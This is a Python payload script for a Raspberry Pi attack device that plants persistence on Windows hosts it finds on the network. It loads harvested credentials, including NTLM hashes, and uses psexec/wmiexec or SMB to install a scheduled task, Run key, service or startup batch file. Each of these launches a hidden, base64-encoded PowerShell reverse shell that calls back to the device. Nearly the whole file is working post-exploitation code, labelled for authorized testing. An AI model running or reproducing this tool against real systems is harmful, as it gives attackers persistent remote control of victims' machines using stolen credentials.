#!/usr/bin/env python3
"""
RaspyJack Payload -- Persistence Planter
-----------------------------------------
Post-exploitation persistence installer for authorized penetration testing.
Uses impacket/smbclient to plant persistence on compromised Windows targets.

FOR AUTHORIZED SECURITY TESTING ONLY.

Methods:
  1. Scheduled Task (schtasks via psexec)
  2. Registry Run Key (reg add via psexec)
  3. Service Creation (sc create via psexec)
  4. Startup Folder drop (via SMB share)

Controls:
  UP/DOWN  : Navigate menus
  LEFT     : Back
  OK       : Select / Execute
  KEY1     : Cycle options
  KEY2     : Cleanup mode (remove persistence)
  KEY3     : Exit
"""

import os
import sys
import time
import json
import socket
import signal
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for p in PINS.values():
    GPIO.setup(p, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

LOOT_DIR = "/root/Raspyjack/loot/Persistence"
CRED_DIRS = [
    "/root/Raspyjack/loot/CrackedNTLM",
    "/root/Raspyjack/loot/DefaultCreds",
    "/root/Raspyjack/loot/SSH",
    "/root/Raspyjack/loot/PtH",
]
IMPLANT_NAME = "RJUpdate"
os.makedirs(LOOT_DIR, exist_ok=True)

running = True
lock = threading.Lock()

# ═══════════════════════════════════════════════════════════════
# STATE
# ═══════════════════════════════════════════════════════════════
state = {
    "screen": "main",      # main, targets, creds, methods, config, exec, results
    "targets": [],          # list of {"ip": ..., "hostname": ...}
    "creds": [],            # list of {"user": ..., "password": ..., "domain": ..., "hash": ...}
    "selected_target": 0,
    "selected_cred": 0,
    "selected_method": 0,
    "callback_ip": "",
    "callback_port": 4444,
    "cleanup_mode": False,
    "results": [],          # list of {"target", "method", "status", "detail"}
    "status": "Ready",
    "scroll": 0,
}

METHODS = [
    {"name": "Sched Task",  "desc": "schtasks /create at logon"},
    {"name": "Reg RunKey",  "desc": "HKLM\\..\\Run registry"},
    {"name": "Service",     "desc": "sc create auto-start svc"},
    {"name": "Startup Dir", "desc": "Drop in Startup folder"},
]

# ═══════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════
def _ts():
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return -1, "Timeout"
    except Exception as e:
        return -1, str(e)


def _check_port(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False


def _scan_targets():
    """Discover Windows hosts with port 445 open."""
    hosts = []
    state["status"] = "ARP scanning..."
    # Get ARP table
    try:
        code, out = _run(["arp", "-n"], timeout=5)
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[2] != "00:00:00:00:00:00":
                ip = parts[0]
                if ip.count(".") == 3:
                    hosts.append(ip)
    except Exception:
        pass

    targets = []
    for i, ip in enumerate(hosts):
        state["status"] = f"Check {ip} ({i+1}/{len(hosts)})"
        if _check_port(ip, 445, timeout=1):
            hostname = ""
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except Exception:
                pass
            targets.append({"ip": ip, "hostname": hostname[:15]})
    return targets


def _load_creds():
    """Load credentials from loot directories."""
    creds = []
    for d in CRED_DIRS:
        if not os.path.isdir(d):
            continue
        for fname in os.listdir(d):
            fpath = os.path.join(d, fname)
            if not os.path.isfile(fpath):
                continue
            try:
                if fname.endswith(".json"):
                    with open(fpath) as f:
                        data = json.load(f)
                    if isinstance(data, list):
                        for entry in data:
                            u = entry.get("user") or entry.get("username", "")
                            p = entry.get("password") or entry.get("pass", "")
                            h = entry.get("hash", "")
                            dom = entry.get("domain", "")
                            if u and (p or h):
                                creds.append({"user": u, "password": p,
                                              "domain": dom, "hash": h,
                                              "source": fname[:12]})
                elif fname.endswith(".txt"):
                    with open(fpath) as f:
                        for line in f:
                            line = line.strip()
                            if ":" in line:
                                parts = line.split(":")
                                if len(parts) >= 2:
                                    creds.append({"user": parts[0], "password": parts[1],
                                                  "domain": "", "hash": "",
                                                  "source": fname[:12]})
            except Exception:
                continue
    # Add default admin cred
    if not creds:
        creds.append({"user": "Administrator", "password": "password",
                      "domain": "", "hash": "", "source": "default"})
    return creds


def _build_exec_cmd(cred, target_ip):
    """Build impacket or smbclient auth command prefix."""
    user = cred["user"]
    password = cred.get("password", "")
    domain = cred.get("domain", "WORKGROUP")
    nt_hash = cred.get("hash", "")

    # Try impacket psexec first
    if os.path.exists("/usr/local/bin/psexec.py") or os.path.exists("/usr/bin/psexec.py"):
        psexec = "psexec.py"
        if nt_hash:
            return [psexec, f"{domain}/{user}@{target_ip}", "-hashes", f":{nt_hash}"]
        return [psexec, f"{domain}/{user}:{password}@{target_ip}"]

    # Fallback: impacket wmiexec
    if os.path.exists("/usr/local/bin/wmiexec.py") or os.path.exists("/usr/bin/wmiexec.py"):
        wmiexec = "wmiexec.py"
        if nt_hash:
            return [wmiexec, f"{domain}/{user}@{target_ip}", "-hashes", f":{nt_hash}"]
        return [wmiexec, f"{domain}/{user}:{password}@{target_ip}"]

    # Fallback: smbclient
    return None


def _exec_remote(cred, target_ip, cmd):
    """Execute a command on remote target."""
    base = _build_exec_cmd(cred, target_ip)
    if base is None:
        return -1, "No exec tool (install impacket)"
    full = base + [cmd]
    return _run(full, timeout=30)


def _smb_upload(cred, target_ip, share, remote_path, local_content):
    """Upload content to SMB share."""
    user = cred["user"]
    password = cred.get("password", "")
    domain = cred.get("domain", "WORKGROUP")

    tmp = f"/tmp/rj_persist_{_ts()}.tmp"
    with open(tmp, "w") as f:
        f.write(local_content)

    cmd = [
        "smbclient", f"//{target_ip}/{share}",
        "-U", f"{domain}/{user}%{password}",
        "-c", f"put {tmp} {remote_path}",
    ]
    code, out = _run(cmd, timeout=15)
    try:
        os.remove(tmp)
    except Exception:
        pass
    return code, out


# ═══════════════════════════════════════════════════════════════
# PERSISTENCE METHODS
# ═══════════════════════════════════════════════════════════════
def _gen_payload_cmd(callback_ip, callback_port):
    """Generate PowerShell reverse shell one-liner."""
    return (
        f'powershell -nop -w hidden -enc '
        + _b64_encode(
            f"$c=New-Object Net.Sockets.TCPClient('{callback_ip}',{callback_port});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
            f"{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$o=(iex $d 2>&1|Out-String);$r=$o+'PS> ';"
            f"$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}"
        )
    )


def _b64_encode(ps_cmd):
    """Base64 encode for PowerShell -enc."""
    import base64
    return base64.b64encode(ps_cmd.encode("utf-16-le")).decode()


def _plant_schtask(cred, target_ip, payload_cmd, cleanup=False):
    """Create/delete scheduled task."""
    if cleanup:
        cmd = f'schtasks /Delete /TN "{IMPLANT_NAME}" /F'
        code, out = _exec_remote(cred, target_ip, cmd)
        return code == 0, out
    cmd = (
        f'schtasks /Create /TN "{IMPLANT_NAME}" /TR "{payload_cmd}" '
        f'/SC ONLOGON /RL HIGHEST /F'
    )
    code, out = _exec_remote(cred, target_ip, cmd)
    return code == 0, out


def _plant_regkey(cred, target_ip, payload_cmd, cleanup=False):
    """Create/delete registry Run key."""
    key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    if cleanup:
        cmd = f'reg delete "{key}" /v "{IMPLANT_NAME}" /f'
        code, out = _exec_remote(cred, target_ip, cmd)
        return code == 0, out
    cmd = f'reg add "{key}" /v "{IMPLANT_NAME}" /t REG_SZ /d "{payload_cmd}" /f'
    code, out = _exec_remote(cred, target_ip, cmd)
    return code == 0, out


def _plant_service(cred, target_ip, payload_cmd, cleanup=False):
    """Create/delete Windows service."""
    if cleanup:
        cmd = f'sc delete "{IMPLANT_NAME}"'
        code, out = _exec_remote(cred, target_ip, cmd)
        return code == 0, out
    cmd = (
        f'sc create "{IMPLANT_NAME}" binPath= "cmd /c {payload_cmd}" '
        f'start= auto DisplayName= "RaspyJack Update Service"'
    )
    code, out = _exec_remote(cred, target_ip, cmd)
    if code == 0:
        _exec_remote(cred, target_ip, f'sc start "{IMPLANT_NAME}"')
    return code == 0, out


def _plant_startup(cred, target_ip, payload_cmd, cleanup=False):
    """Drop/remove script in Startup folder via SMB."""
    script_name = f"{IMPLANT_NAME}.bat"
    if cleanup:
        cmd = [
            "smbclient", f"//{target_ip}/C$",
            "-U", f"{cred.get('domain','WORKGROUP')}/{cred['user']}%{cred.get('password','')}",
            "-c", f"del Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\"
                  f"Start Menu\\Programs\\Startup\\{script_name}",
        ]
        code, out = _run(cmd)
        return code == 0, out
    content = f"@echo off\r\n{payload_cmd}\r\n"
    code, out = _smb_upload(
        cred, target_ip, "C$",
        f"Users\\Public\\Desktop\\{script_name}",
        content,
    )
    return code == 0, out


PLANT_FUNCS = [_plant_schtask, _plant_regkey, _plant_service, _plant_startup]


# ═══════════════════════════════════════════════════════════════
# EXECUTE
# ═══════════════════════════════════════════════════════════════
def _execute_persistence():
    """Run the selected persistence method against target."""
    t = state["targets"][state["selected_target"]]
    c = state["creds"][state["selected_cred"]]
    m = state["selected_method"]
    cleanup = state["cleanup_mode"]

    target_ip = t["ip"]
    payload_cmd = _gen_payload_cmd(state["callback_ip"], state["callback_port"])
    method_name = METHODS[m]["name"]

    state["status"] = f"{'Cleaning' if cleanup else 'Planting'} {method_name}..."
    plant_func = PLANT_FUNCS[m]
    success, detail = plant_func(c, target_ip, payload_cmd, cleanup=cleanup)

    result = {
        "target": target_ip,
        "hostname": t.get("hostname", ""),
        "method": method_name,
        "user": c["user"],
        "action": "cleanup" if cleanup else "plant",
        "status": "SUCCESS" if success else "FAILED",
        "detail": detail[:200],
        "timestamp": _ts(),
    }
    state["results"].append(result)
    state["status"] = f"{'Cleaned' if cleanup else 'Planted'}: {method_name}"

    # Save to loot
    loot_path = os.path.join(LOOT_DIR, f"persistence_{_ts()}.json")
    try:
        with open(loot_path, "w") as f:
            json.dump(state["results"], f, indent=2)
    except Exception:
        pass

    return success


# ═══════════════════════════════════════════════════════════════
# DRAWING
# ═══════════════════════════════════════════════════════════════
def _draw(lcd):
    img = Image.new("RGB", (WIDTH, HEIGHT), (0, 0, 0))
    d = ScaledDraw(img)
    screen = state["screen"]

    # Header
    hdr_col = (80, 0, 0) if state["cleanup_mode"] else (0, 30, 50)
    d.rectangle((0, 0, 127, 12), fill=hdr_col)
    title = "CLEANUP" if state["cleanup_mode"] else "PERSISTENCE"
    d.text((2, 1), title, font=font, fill=(255, 100, 100) if state["cleanup_mode"] else (0, 220, 255))

    if screen == "main":
        items = [
            f"Targets: {len(state['targets'])}",
            f"Creds: {len(state['creds'])}",
            f"Method: {METHODS[state['selected_method']]['name']}",
            f"CB: {state['callback_ip']}:{state['callback_port']}",
            ">> EXECUTE <<" if state["targets"] and state["creds"] else "Scan first",
            f"Results: {len(state['results'])}",
        ]
        cursor = state["scroll"]
        for i, item in enumerate(items):
            y = 16 + i * 14
            col = (0, 255, 0) if i == cursor else (150, 150, 150)
            if i == cursor:
                d.rectangle((0, y - 1, 127, y + 11), fill=(0, 30, 0))
            d.text((4, y), item[:22], font=font, fill=col)

        d.rectangle((0, 117, 127, 127), fill=(0, 15, 0))
        d.text((2, 118), "OK=Go K1=Opt K2=Clean", font=font, fill=(0, 80, 0))

    elif screen == "targets":
        d.text((50, 1), f"{len(state['targets'])}", font=font, fill=(0, 255, 0))
        if not state["targets"]:
            d.text((10, 50), "No targets found", font=font, fill=(100, 100, 100))
            d.text((10, 65), "OK = Scan network", font=font, fill=(0, 150, 0))
        else:
            scroll = state["scroll"]
            for i, t in enumerate(state["targets"][scroll:scroll + 7]):
                y = 16 + i * 14
                sel = (scroll + i) == state["selected_target"]
                if sel:
                    d.rectangle((0, y - 1, 127, y + 11), fill=(0, 40, 0))
                col = (0, 255, 0) if sel else (150, 150, 150)
                label = f"{t['ip']}"
                if t.get("hostname"):
                    label += f" {t['hostname'][:6]}"
                d.text((4, y), label[:22], font=font, fill=col)
        d.rectangle((0, 117, 127, 127), fill=(0, 15, 0))
        d.text((2, 118), "OK=Select K3=Back", font=font, fill=(0, 80, 0))

    elif screen == "creds":
        d.text((50, 1), f"{len(state['creds'])}", font=font, fill=(255, 220, 0))
        if not state["creds"]:
            d.text((10, 50), "No creds found", font=font, fill=(100, 100, 100))
            d.text((10, 65), "OK = Load from loot", font=font, fill=(0, 150, 0))
        else:
            scroll = state["scroll"]
            for i, c in enumerate(state["creds"][scroll:scroll + 7]):
                y = 16 + i * 14
                sel = (scroll + i) == state["selected_cred"]
                if sel:
                    d.rectangle((0, y - 1, 127, y + 11), fill=(0, 40, 0))
                col = (255, 220, 0) if sel else (150, 150, 150)
                label = f"{c['user']}:{c.get('password','***')[:6]}"
                d.text((4, y), label[:22], font=font, fill=col)
        d.rectangle((0, 117, 127, 127), fill=(0, 15, 0))
        d.text((2, 118), "OK=Select K3=Back", font=font, fill=(0, 80, 0))

    elif screen == "methods":
        for i, m in enumerate(METHODS):
            y = 16 + i * 22
            sel = i == state["selected_method"]
            if sel:
                d.rectangle((0, y - 1, 127, y + 19), fill=(0, 30, 50))
            col = (0, 220, 255) if sel else (100, 100, 100)
            d.text((4, y), m["name"], font=font, fill=col)
            d.text((4, y + 10), m["desc"][:20], font=font, fill=(80, 80, 80))
        d.rectangle((0, 117, 127, 127), fill=(0, 15, 0))
        d.text((2, 118), "OK=Select K3=Back", font=font, fill=(0, 80, 0))

    elif screen == "exec":
        t = state["targets"][state["selected_target"]] if state["targets"] else {"ip": "?"}
        c = state["creds"][state["selected_cred"]] if state["creds"] else {"user": "?"}
        m = METHODS[state["selected_method"]]
        action = "CLEANUP" if state["cleanup_mode"] else "PLANT"

        d.text((4, 16), f"Target: {t['ip']}", font=font, fill=(255, 255, 255))
        d.text((4, 30), f"User: {c['user']}", font=font, fill=(255, 220, 0))
        d.text((4, 44), f"Method: {m['name']}", font=font, fill=(0, 220, 255))
        d.text((4, 58), f"Action: {action}", font=font,
               fill=(255, 0, 0) if state["cleanup_mode"] else (0, 255, 0))
        d.text((4, 72), f"CB: {state['callback_ip']}", font=font, fill=(150, 150, 150))
        d.text((4, 86), state["status"][:22], font=font, fill=(255, 200, 0))

        d.rectangle((0, 117, 127, 127), fill=(0, 15, 0))
        d.text((2, 118), "OK=Execute K3=Back", font=font, fill=(0, 80, 0))

    elif screen == "results":
        if not state["results"]:
            d.text((10, 50), "No results yet", font=font, fill=(100, 100, 100))
        else:
            scroll = state["scroll"]
            for i, r in enumerate(state["results"][scroll:scroll + 6]):
                y = 16 + i * 16
                col = (0, 255, 0) if r["status"] == "SUCCESS" else (255, 0, 0)
                d.text((4, y), f"{r['target']} {r['method']}", font=font, fill=col)
                d.text((4, y + 8), r["status"][:20], font=font, fill=(100, 100, 100))
        d.rectangle((0, 117, 127, 127), fill=(0, 15, 0))
        d.text((2, 118), "K3=Back", font=font, fill=(0, 80, 0))

    # Status bar
    d.text((70, 1), state["status"][:10], font=font, fill=(100, 100, 100))

    lcd.LCD_ShowImage(img, 0, 0)


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════
def main():
    global running

    state["callback_ip"] = _get_local_ip()

    def _sig(s, f):
        global running
        running = False
    signal.signal(signal.SIGTERM, _sig)
    signal.signal(signal.SIGINT, _sig)

    try:
        while running:
            _draw(LCD)
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if state["screen"] == "main":
                    break
                state["screen"] = "main"
                state["scroll"] = 0

            elif btn == "KEY2":
                state["cleanup_mode"] = not state["cleanup_mode"]

            elif state["screen"] == "main":
                items_count = 6
                if btn == "UP":
                    state["scroll"] = (state["scroll"] - 1) % items_count
                elif btn == "DOWN":
                    state["scroll"] = (state["scroll"] + 1) % items_count
                elif btn == "OK":
                    sel = state["scroll"]
                    if sel == 0:  # Targets
                        state["screen"] = "targets"
                        state["scroll"] = 0
                        if not state["targets"]:
                            state["targets"] = _scan_targets()
                            state["status"] = f"{len(state['targets'])} hosts"
                    elif sel == 1:  # Creds
                        state["screen"] = "creds"
                        state["scroll"] = 0
                        if not state["creds"]:
                            state["creds"] = _load_creds()
                            state["status"] = f"{len(state['creds'])} creds"
                    elif sel == 2:  # Method
                        state["screen"] = "methods"
                        state["scroll"] = 0
                    elif sel == 3:  # Config callback
                        state["callback_port"] = (state["callback_port"] % 9999) + 1
                    elif sel == 4:  # Execute
                        if state["targets"] and state["creds"]:
                            state["screen"] = "exec"
                    elif sel == 5:  # Results
                        state["screen"] = "results"
                        state["scroll"] = 0

            elif state["screen"] == "targets":
                if btn == "UP":
                    state["selected_target"] = max(0, state["selected_target"] - 1)
                    state["scroll"] = max(0, state["selected_target"] - 3)
                elif btn == "DOWN":
                    state["selected_target"] = min(len(state["targets"]) - 1,
                                                    state["selected_target"] + 1)
                    state["scroll"] = max(0, state["selected_target"] - 3)
                elif btn == "OK":
                    if not state["targets"]:
                        state["targets"] = _scan_targets()
                    else:
                        state["screen"] = "main"

            elif state["screen"] == "creds":
                if btn == "UP":
                    state["selected_cred"] = max(0, state["selected_cred"] - 1)
                    state["scroll"] = max(0, state["selected_cred"] - 3)
                elif btn == "DOWN":
                    state["selected_cred"] = min(len(state["creds"]) - 1,
                                                  state["selected_cred"] + 1)
                    state["scroll"] = max(0, state["selected_cred"] - 3)
                elif btn == "OK":
                    if not state["creds"]:
                        state["creds"] = _load_creds()
                    else:
                        state["screen"] = "main"

            elif state["screen"] == "methods":
                if btn == "UP":
                    state["selected_method"] = (state["selected_method"] - 1) % len(METHODS)
                elif btn == "DOWN":
                    state["selected_method"] = (state["selected_method"] + 1) % len(METHODS)
                elif btn == "OK":
                    state["screen"] = "exec"

            elif state["screen"] == "exec":
                if btn == "OK":
                    threading.Thread(target=_execute_persistence, daemon=True).start()
                elif btn == "LEFT":
                    state["screen"] = "main"

            elif state["screen"] == "results":
                if btn == "UP":
                    state["scroll"] = max(0, state["scroll"] - 1)
                elif btn == "DOWN":
                    state["scroll"] = min(max(0, len(state["results"]) - 6),
                                          state["scroll"] + 1)

            time.sleep(0.05)

    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
